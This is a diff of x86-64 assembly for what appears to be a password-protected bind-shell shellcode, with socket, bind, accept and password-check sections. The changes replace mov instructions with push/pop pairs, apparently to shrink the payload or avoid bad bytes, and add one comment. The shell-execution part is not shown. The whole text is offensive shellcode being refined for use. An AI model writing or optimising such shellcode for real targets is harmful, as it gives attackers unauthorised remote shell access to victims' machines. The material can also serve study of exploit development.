@@ -23,7 +23,8 @@ socket:
     cdq       ; copies rax's bit 31 to all bits of edx (zeroes rdx)
     syscall
 
-    mov rdi, rax
+    push rax
+    pop rdi
 
 bind:
     ; server.sin_family = AF_INET;    short
@@ -43,6 +44,7 @@ bind:
     ; INADDR_ANY = 0
     ; AF_INET = 2
     ; __NR_bind = 49
+    ; On  success,  zero is returned
 
     xor eax, eax  ; shorter and will still zero the upper bytes
     push rax      ; sin_zero
@@ -53,7 +55,8 @@ bind:
 
     ; bind
     add al, 49
-    mov rsi, rsp
+    push rsp
+    pop rsi
     add dl, 16    ; sizeof(sockaddr_in)
     syscall
 
@@ -75,7 +78,8 @@ accept:
     ;xor rdx, rdx
     syscall
     
-    mov rbx, rax
+    push rax
+    pop rbx
 
     ; close(sock)
     ; __NR_close = 3
@@ -108,7 +112,8 @@ check_password:
     xor eax, eax
     ; rdi = fd (bound socket)
     sub rsp, 16   ; create space for "buf" in the stack
-    mov rsi, rsp  ; rsi = *buf
+    push rsp
+    pop rsi       ; rsi = *buf
     mov dl, 16
     syscall
 
